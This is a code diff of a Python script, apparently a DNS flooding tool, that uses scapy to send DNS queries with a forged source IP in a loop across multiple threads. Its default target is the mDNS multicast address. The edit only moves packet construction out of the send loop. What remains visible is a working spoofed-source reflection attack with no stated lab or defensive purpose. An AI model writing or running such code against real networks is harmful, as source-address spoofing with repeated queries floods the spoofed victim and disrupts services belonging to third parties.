@@ -1,5 +1,6 @@
 import argparse
 import threading
+
 import dns.message
 import dns.rdatatype
 from scapy.layers.inet import UDP, IP
@@ -10,9 +11,9 @@ def send_dns_query(domain_name, dns_server="224.0.0.251", dns_port=53, rr_type='
     # Create a DNS query message
     message = create_dns_query(domain_name, rr_type, flags)
 
-    # dns_query = IP(dst=dns_server) / UDP(sport=54321, dport=53) / DNS(rd=1, qd=DNSQR(qname=target))
+    packet = IP(dst=dns_server, src=spoofed_ip) / UDP(sport=dns_port, dport=dns_port) / message.to_wire()
     while(args.nrequest):
-        send(IP(dst=dns_server, src=spoofed_ip) / UDP(sport=dns_port, dport=dns_port) / message.to_wire(),verbose=0)
+        send(packet)
         args.nrequest -= 1
 
 
@@ -73,3 +74,4 @@ for _ in range(args.nthread):
 # Wait for all threads to finish
 for thread in threads:
     thread.join()
+
